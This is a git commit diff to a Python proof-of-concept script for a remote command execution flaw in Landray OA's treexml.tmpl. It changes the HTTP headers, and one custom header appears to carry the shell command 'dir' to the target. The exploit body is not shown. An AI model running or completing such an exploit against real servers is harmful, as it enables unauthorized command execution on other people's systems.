083fa30962d7e9f9f3e52946b77a6f5113cc1c8c
MD-SEC <MD_SEC@163.com>
2023-08-15 01:18:15 +0800

    蓝凌OA treexml.tmpl 远程命令执行漏洞

--- Landray_Oa_Treexml_Rce_Poc.py
+++ Landray_Oa_Treexml_Rce_Poc.py
@@ -34,7 +34,7 @@ def poc(host):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-        "Accept-Encoding": "gzip, deflate",
+        "Accept-Encoding": "",
         "Host": "%s" %host,
         "Content-Type": "application/x-www-form-urlencoded",
         "MDSEC": "dir"
